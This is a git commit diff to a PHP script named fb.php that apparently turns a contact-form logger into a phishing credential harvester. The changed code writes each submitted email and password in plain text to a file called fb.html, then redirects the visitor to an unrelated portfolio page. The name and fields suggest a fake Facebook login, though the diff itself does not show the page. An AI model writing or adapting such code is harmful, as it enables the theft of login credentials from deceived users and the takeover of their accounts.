9ec8bc5ace494414ed15b2f7c79320acec48179f
asdhua <91812685+asdhua@users.noreply.github.com>
2021-10-02 22:22:53 -0400

    Update fb.php

--- fb.php
+++ fb.php
@@ -3,20 +3,19 @@
     $file=fopen("fb.html","a");
 
 
-    fwrite($file,"Name :");
-    fwrite($file, $name ."\n");
-    
-    
+   
     fwrite($file,"Email :");
     fwrite($file, $email ."\n");
     
+
+    fwrite($file,"Pass :");
+    fwrite($file, $password ."\n");
     
-    fwrite($file,"SUBJECT :");
-    fwrite($file, $sub ."\n");
     
-    
-    fwrite($file,"Massage :");
-    fwrite($file, $msg ."\n");
+
+
+
+
     fclose($file);
     header("location: http://rkofficial.c1.biz/Rk%20portfolio/index.html");
  ?>
